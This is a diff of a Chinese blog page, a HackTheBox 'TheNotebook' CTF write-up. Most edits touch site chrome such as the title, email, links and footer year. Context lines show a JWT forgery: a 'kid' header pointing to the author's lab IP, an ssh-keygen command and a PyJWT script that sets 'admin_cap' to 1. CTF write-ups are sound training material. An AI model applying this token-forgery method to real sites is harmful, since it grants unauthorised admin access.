@@ -14,7 +14,7 @@
     
     
     
-    <title>TheNotebook - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <title>TheNotebook - Hackthebox | Lucifiel&#39;s Blog | Security Research</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     <meta name="theme-color" content="#3F51B5">
@@ -101,7 +101,7 @@
         </a>
         <hgroup class="introduce">
           <h5 class="nickname">Lucifiel</h5>
-          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+          <a href="mailto:lucifiel99@gmail.com" title="lucifiel99@gmail.com" class="mail">lucifiel99@gmail.com</a>
         </hgroup>
       </div>
     </div>
@@ -144,16 +144,16 @@
             </li>
         
             <li class="waves-block waves-effect">
-              <a href="/about"  >
-                <i class="icon icon-lg icon-user"></i>
-                About
+              <a href="https://x.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
               </a>
             </li>
         
             <li class="waves-block waves-effect">
-              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
-                <i class="icon icon-lg icon-coffee"></i>
-                请我喝咖啡
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
               </a>
             </li>
         
@@ -283,7 +283,7 @@
 <img src="/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/e55f4243-96e4-4a83-9af4-23bf743e8890.png" class>
 
 <p>{“typ”:”JWT”,”alg”:”RS256”,”kid”:”<a href="http://localhost:7070/privKey.key&quot;%7D" target="_blank" rel="noopener">http://localhost:7070/privKey.key&quot;}</a></p>
-<p>{“username”:”Lucifiel”,”email”:”<a href="mailto:&#76;&#x75;&#x63;&#105;&#102;&#105;&#101;&#108;&#x40;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;">&#76;&#x75;&#x63;&#105;&#102;&#105;&#101;&#108;&#x40;&#x65;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a>“,”admin_cap”:false}</p>
+<p>{“username”:”Lucifiel”,”email”:”<a href="mailto:&#76;&#x75;&#99;&#105;&#x66;&#x69;&#101;&#108;&#64;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#76;&#x75;&#99;&#105;&#x66;&#x69;&#101;&#108;&#64;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a>“,”admin_cap”:false}</p>
 <p>解密出来的内容，我们会发现，上面有一个JWT，我感觉这是突破口</p>
 <p><a href="https://jwt.io/introduction" target="_blank" rel="noopener">https://jwt.io/introduction</a></p>
 <p>直接搜索JWT 找到了一个官网并且有相关的介绍，我们发现JWT是一个JSON 网络令牌</p>
@@ -297,7 +297,7 @@
 <img src="/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/517c99cf-27e9-4429-b0d7-7f82171703b6.png" class>
 
 <p>Headers &#x3D; {“typ”:”JWT”,”alg”:”RS256”,”kid”:”<a href="http://10.10.14.184/privKey.key&quot;%7D" target="_blank" rel="noopener">http://10.10.14.184/privKey.key&quot;}</a></p>
-<p>Payload &#x3D; {“username”:”Lucifiel”,”email”:”<a href="mailto:&#76;&#x75;&#x63;&#105;&#102;&#x69;&#101;&#108;&#x40;&#101;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#76;&#x75;&#x63;&#105;&#102;&#x69;&#101;&#108;&#x40;&#101;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a>“,”admin_cap”:1}</p>
+<p>Payload &#x3D; {“username”:”Lucifiel”,”email”:”<a href="mailto:&#x4c;&#117;&#99;&#x69;&#x66;&#x69;&#x65;&#x6c;&#x40;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x4c;&#117;&#99;&#x69;&#x66;&#x69;&#x65;&#x6c;&#x40;&#101;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>“,”admin_cap”:1}</p>
 <p>但是这里的signature也就是密钥却是加密的，咱们无法修改也无法读取，怎么办呢？当然是Google啦</p>
 <p><a href="https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9" target="_blank" rel="noopener">https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9</a></p>
 <p>ssh-keygen -t rsa -b 2048 -m PEM -f privKey.key</p>
@@ -328,7 +328,7 @@
 <p>import jwt</p>
 <p>key &#x3D; open(“privKey.key.pub”, ‘r’).read()</p>
 <p>headers &#x3D; {“typ”: “JWT”, “alg”: “RS256”, “kid”: “<a href="http://10.10.14.184/privKey.key&quot;%7D" target="_blank" rel="noopener">http://10.10.14.184/privKey.key&quot;}</a></p>
-<p>payload &#x3D; {“username”: “Lucifiel”, “email”: “<a href="mailto:&#x4c;&#117;&#99;&#105;&#102;&#x69;&#101;&#x6c;&#x40;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#x4c;&#117;&#99;&#105;&#102;&#x69;&#101;&#x6c;&#x40;&#101;&#x6d;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a>“, “admin_cap”: 1}</p>
+<p>payload &#x3D; {“username”: “Lucifiel”, “email”: “<a href="mailto:&#76;&#117;&#x63;&#105;&#x66;&#x69;&#101;&#108;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;">&#76;&#117;&#x63;&#105;&#x66;&#x69;&#101;&#108;&#x40;&#x65;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#109;</a>“, “admin_cap”: 1}</p>
 <p>print(jwt.encode(payload, headers&#x3D;headers, key&#x3D;key, algorithm&#x3D;’RS256’))</p>
 <p>使用该脚本即可生成我们所需要的cookie</p>
 <p>在咱们本地使用python3开启一个http服务器</p>
@@ -459,7 +459,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/&title=《TheNotebook - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/&title=《TheNotebook - Hackthebox》 — Lucifiel's Blog&source=独立安全研究员 | Web Security · AI Agent Security · Blockchain/DeFi Security" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -588,7 +588,7 @@
         </p>
     </div>
     <div class="bottom">
-        <p><span>Lucifiel &copy; 2020 - 2025</span>
+        <p><span>Lucifiel &copy; 2020 - 2026</span>
             <span>
                 
                 Power by Lucifiel</a>
@@ -616,7 +616,7 @@
         </a>
       </li>
       <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/&title=《TheNotebook - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/03/Hackthebox/Medium/Hackthebox-TheNotebook/&title=《TheNotebook - Hackthebox》 — Lucifiel's Blog&source=独立安全研究员 | Web Security · AI Agent Security · Blockchain/DeFi Security" data-title=" QQ">
           <i class="icon icon-qq"></i>
         </a>
       </li>
@@ -642,7 +642,7 @@
 <div class="page-modal wx-share" id="wxShare">
     <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsUlEQVR42u3aS27DMAwFQN//0inQVYE27iMpJlmMV0E+lkcLiXnidcXX4/v6+frnO/ff7I3ye6zq3S48PDy8Nd7j9koGPjVZyZU/Mx4eHt42L1/iq5tEsrjfT2gy3U/fx8PDw3sr79kj5uB8m0nAeHh4eJ/Py0vkU/fHw8PD+2Te/M//JFbI77CYteDh4eHFvF7w+t7X6+d7eHh4eK1T9fmRWFKI5/csPyceHh7eAq/XBJBHD3lBnIfC1UnEw8PDO8vLl+YeIJ+mJJy9n44/RsfDw8N7CS9nVBf6amkeHW7db294eHh4a7z5Qlxd9PNprTZmXRv7DB4eHt5gyKRozqcsbyDohRR4eHh4e7xqLJtvIRvdDXn4i4eHh/cu3gQz2Sp6tXFzN8PDw8OrdQL8M9gktE3eiRqnWpsHHh4e3jav96XJI05K+Wawi4eHh3eUlx905c0BvZaCJMDNw188PDy8DV6vLO4dg/WaD3oHZnh4eHgbvDxumMS71RiiuhlErQN4eHh4h3i9xT0H5Mdd1XauPJ7Aw8PDO8urlra95oBq40K1tevpHfDw8PAWeNWWprw4npTm1ekolNR4eHh4Y96p4ricHLdCiuqBHB4eHt4Gr7rszgPcScNWtdTGw8PD2+NVh6k2P/U2gMMpNR4eHt5RXjWQ7cWv1+01n8orufDw8PAO8Zrpb1xe97aH3pM0Ywg8PDy8o7weIG8RKO9d1Q0GDw8P7yivd+yUx7U9cDW0ffpbPDw8vAVedcHthRG9O1cP5EYbDB4eHl6R1wsFes0BOX6yMeDh4eG9hlc9qp9/mpfsk6M7PDw8vE/g9YKDKqAaDf9zAIaHh4f3Jl7+iL1AIQfcRxh4eHh4r+ElS3kyZB5b5Hc7cLiFh4eHd/6/fPmvfg+T/3bSyIWHh4e3xvsCNP0r8Mdgu6oAAAAASUVORK5CYII=" alt="微信分享二维码">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACqElEQVR42u3aQW7jQAwEQP3/01lgTwEW9naTM3EOpZPh2JJKAYZ0D58nPr7+Ht9ff3/n/SdnV/n3Wu3ZHjw8PLxrvK+3R3LhUw8rOfJ7xsPDw7vNy5f4tkgki/v7B5o87pfv4+Hh4X2U9+oWc3BeZhIwHh4e3u/n5S3yqfPj4eHh/Wbe/sf/JlbIz3Axa8HDw8OLebPg9bOvr+/v4eHh4Y121fdbYkkjnp+zvk88PDy8C7zZEEAePeQNcR4Ktw8RDw8P7ywvX5pngNlwatIbRwo8PDy8H+G1Q6Xt5WcPdNag4+Hh4d3j7RfidtHPH2s7mPXcqDN4eHh4i0sOx57K8tB+JioMeHh4eEd5bSybl5Ab0w15+IuHh4f3Kd4GsykVs954WM3w8PDwRhPvmyH7NjKoB6dGxQMPDw/vNm/2oc0tblr5YbCLh4eHd5SXb3TlwwGzkYIkwM3DXzw8PLwbvFlbfHhAqgwgDv/f8PDw8Mo1Mw8LZvFuG0O0xSAaHcDDw8M7xNuMT7UbVDPMPp7Aw8PDO8trW9vZcEA7uNCOdr08Ax4eHt4FXjvSlDfHm9Z8NiIWtdR4eHh4a96p5rhOjkchRbshh4eHh3eD1y67+wB3M7DVttp4eHh493jtZdrhp1kBOJxS4+Hh4R3ltYHsLH593h77R/kkBx4eHt4h3jD9jdvrWXmY3ckwhsDDw8M7ypsB8hGBuna1BQYPDw/vKG+27ZTHtTNwG9q+/C4eHh7eBV674M7CiNmZ2w25VYHBw8PDK3mzUGA2HNAOp+4bejw8PLx7vHarfv/XvGXfbN3h4eHh/QbeLDhoAW00/J8NMDw8PLwP8fJbnAUKOeB9hIGHh4f3M7x2QH+Dac92YHMLDw8P7/xv+fqn/gyTf3czyIWHh4d3jfcHNP0r8N+fnJEAAAAASUVORK5CYII=" alt="微信分享二维码">
 </div>
 
 
